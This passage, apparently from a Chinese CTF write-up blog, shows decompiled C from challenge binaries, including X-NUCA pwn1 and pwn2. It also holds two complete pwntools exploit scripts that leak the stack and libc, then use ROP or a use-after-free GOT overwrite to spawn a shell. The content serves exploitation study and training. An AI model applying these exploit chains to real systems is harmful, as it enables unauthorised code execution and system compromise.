class="number">0x70</span>;</span><br><span class="line">      v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      a[<span class="number">2</span> * idx] = size;</span><br><span class="line">      a[<span class="number">2</span> * idx + <span class="number">1</span>] = v2;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"content: "</span>);</span><br><span class="line">      content(a[<span class="number">2</span> * idx + <span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"the index is :%d \n"</span>, idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">  v2 = getchoice();</span><br><span class="line">  v0 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = a[<span class="number">2</span> * v2 + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        a[<span class="number">2</span> * v2] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>((<span class="keyword">void</span> *)a[<span class="number">2</span> * v2 + <span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>rop的exp。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"arm"</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./pwn3"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./pwn3"</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_r3 = <span class="number">0x000105c8</span></span><br><span class="line">mov_r0_r3 = <span class="number">0x10e60</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_pwd</span><span class="params">(pwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Please Input new password:"</span>,pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"continue ..."</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username:"</span>)</span><br><span class="line">    <span class="comment">#uname = "a"*0x1c+p32(p_r3)+p32(elf.got['puts'])+p32(mov_r0_r3)</span></span><br><span class="line">    uname = <span class="string">"a"</span>*<span class="number">4</span></span><br><span class="line">    p.sendline(uname)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input password:"</span>)</span><br><span class="line">    pwd = <span class="string">"456"</span></span><br><span class="line">    p.sendline(pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input password again:"</span>)</span><br><span class="line">    p.sendline(pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"continue ..."</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    mod_pwd(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">    stack_addr = u32(p.recvn(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">    log.success(<span class="string">"stack addr =&gt; &#123;&#125;"</span>.format(hex(stack_addr)))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    mod_pwd(<span class="string">"c"</span>*<span class="number">0x30</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"c"</span>*<span class="number">0x30</span>)</span><br><span class="line">    libc_base = u32(p.recvn(<span class="number">4</span>)) - <span class="number">44</span> - libc.sym[<span class="string">'strtol'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    p_r0 = libc_base + <span class="number">0x0011e54c</span></span><br><span class="line">    p_r0_r1_r2_r3 = libc_base + <span class="number">0x0011ebc8</span></span><br><span class="line">    binsh = libc_base + <span class="number">0x00131bec</span></span><br><span class="line">    system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    payload = p32(stack_addr<span class="number">-0x20</span>)+p32(p_r0)+p32(binsh)+p32(system)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x3c</span>,<span class="string">'a'</span>)</span><br><span class="line">    payload += p32(stack_addr+<span class="number">4</span>)+p32(<span class="number">0x10f0c</span>)</span><br><span class="line">    mod_pwd(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<p>uaf的exp.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"arm"</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">libc = ELF(<span class="string">'/usr/arm-linux-gnueabi/lib/libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./pwn3"</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-arm"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/arm-linux-gnueabi/"</span>, <span class="string">"./pwn3"</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_r3 = <span class="number">0x000105c8</span></span><br><span class="line">mov_r0_r3 = <span class="number">0x10e60</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz,content=<span class="string">'\n'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,str(sz))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_pwd</span><span class="params">(pwd)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Please Input new password:"</span>,pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"continue ..."</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(idx,sz,content=<span class="string">'\n'</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,<span class="string">"2"</span>*idx+<span class="string">'\x00'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>,<span class="string">"3"</span>*sz+<span class="string">'\x00'</span>)</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele1</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"1\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"22\x00"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>,<span class="string">"2"</span>*idx+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username:"</span>)</span><br><span class="line">    <span class="comment">#uname = "a"*0x1c+p32(p_r3)+p32(elf.got['puts'])+p32(mov_r0_r3)</span></span><br><span class="line">    uname = <span class="string">"a"</span>*<span class="number">4</span></span><br><span class="line">    p.sendline(uname)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input password:"</span>)</span><br><span class="line">    pwd = <span class="string">"456"</span></span><br><span class="line">    p.sendline(pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input password again:"</span>)</span><br><span class="line">    p.sendline(pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"continue ..."</span>)</span><br><span class="line">    p.send(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x4</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x4</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x4</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">"%29$p\n"</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">"/bin/sh\x00\n"</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">5</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0x4</span>,p32(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0x4</span>)</span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0x4</span>,p32(elf.plt[<span class="string">'printf'</span>]))</span><br><span class="line">    p.sendlineafter(<span class="string">"choice &gt; "</span>,<span class="string">"%25$p\n"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">    libc_base = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">272</span> - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    dele1(<span class="number">4</span>)</span><br><span class="line">    dele1(<span class="number">4</span>)</span><br><span class="line">    add1(<span class="number">1</span>,<span class="number">0x4</span>,p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">    add1(<span class="number">2</span>,<span class="number">0x4</span>)</span><br><span class="line">    add1(<span class="number">3</span>,<span class="number">0x4</span>,p32(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    dele1(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="X-NUCA个人赛pwn1"><a href="#X-NUCA个人赛pwn1" class="headerlink" title="X-NUCA个人赛pwn1"></a>X-NUCA个人赛pwn1</h2><h3 id="漏洞分析-amp-amp-漏洞利用-1"><a href="#漏洞分析-amp-amp-漏洞利用-1" class="headerlink" title="漏洞分析 &amp;&amp; 漏洞利用"></a>漏洞分析 &amp;&amp; 漏洞利用</h3><p>hello函数中输入you时可以溢出，伪造<code>you[8]</code>的文件指针，伪造vtable，从而在flcose时执行gadget让esp到达栈上布置的rop，由于scanf的输入有很多gadget截断，这里再read一次，迁移到bss去执行sys_execve系统调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  init_0();</span><br><span class="line">  hello();</span><br><span class="line">  menu((<span class="keyword">int</span>)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to baby xnuca2020~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I want to know your name"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>, you);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Hello %s, I have kept you in mind\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)you);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __usercall menu@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-24h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-20h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Read a file"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Print a file"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      _isoc99_scanf(<span class="string">"%s"</span>, &amp;v3);</span><br><span class="line">      v2 = atoi(&amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      xPrint((<span class="keyword">int</span>)&amp;v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">      xRead();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choise"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( you[<span class="number">8</span>] )</span><br><span class="line">    fclose((<span class="keyword">int</span> *)you[<span class="number">8</span>]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">xRead</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-40h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_80490C0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the file path: "</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%32s"</span>, &amp;v2);</span><br><span class="line">  v0 = (<span class="keyword">char</span> *)&amp;v2 + <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v2);</span><br><span class="line">  *(_DWORD *)v0 = 'unx_';</span><br><span class="line">  *((_WORD *)v0 + 2) = 'ac';</span><br><span class="line">  v0[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  you[<span class="number">8</span>] = fopen((<span class="keyword">int</span>)&amp;v2, (<span class="keyword">int</span>)<span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( you[<span class="number">8</span>] )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fake_flag&#123;fake_flag&#125;"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"GG"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __usercall xPrint@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-110h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( you[<span class="number">8</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Start"</span>);</span><br><span class="line">    fread((<span class="keyword">int</span>)&amp;v2, <span class="number">0x100</span>u, <span class="number">1</span>, (_DWORD *)you[<span class="number">8</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="X-NUCA个人赛pwn2"><a href="#X-NUCA个人赛pwn2" class="headerlink" title="X-NUCA个人赛pwn2"></a>X-NUCA个人赛pwn2</h2><h3 id="漏洞分析-amp-amp-漏洞利用-2"><a href="#漏洞分析-amp-amp-漏洞利用-2" class="headerlink" title="漏洞分析 &amp;&amp;　漏洞利用"></a>漏洞分析 &amp;&amp;　漏洞利用</h3><p>这道题很有意思，在团队赛时也有一个类似的洞，这题和pwn1有些相似，但是由于you的输入没有溢出，无法控制<code>you[65]</code>指针。在xRead函数里有一次输入，sz可控，我们输入超过bss段的sz，从而在<code>v2 += read(0, (char *)&amp;you[66] + v2, v3 - v2);</code>时返回-1，在之后输入即可控制<code>you[65]</code>，由于前面已经Leak出了libc，这里直接给个one_gadget(由于远程没打不知道版本，如果gadget都不可行再用点别的gadget去执行rop如pwn1)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  init();</span><br><span class="line">  hello();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">FILE **<span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE **result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  signal(<span class="number">14</span>, (<span class="keyword">__sighandler_t</span>)handle);</span><br><span class="line">  alarm(<span class="number">0x5A</span>u);</span><br><span class="line">  result = you;</span><br><span class="line">  you[<span class="number">65</span>] = (FILE *)bye;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to baby xnuca2020~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I want to know your name again"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%256s"</span>, you);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s, I have kept you in mind\n"</span>, you);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will give a present to you."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;<span class="built_in">calloc</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp-2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp-28h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp-24h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp-20h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp-1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-18h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp-14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp-Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp-8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp-4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr32 &#125;</span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"1.Create a file"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"2.Print a file"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"3.Exit"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%s"</span>, &amp;v4);</span><br><span class="line">      v3 = atoi((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      xPrint((<span class="keyword">int</span>)&amp;v11);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      xRead();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choise"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( you[<span class="number">64</span>] )</span><br><span class="line">    fclose(you[<span class="number">64</span>]);</span><br><span class="line">  ((<span class="keyword">void</span> (__stdcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))you[<span class="number">65</span>])(</span><br><span class="line">    v1,</span><br><span class="line">    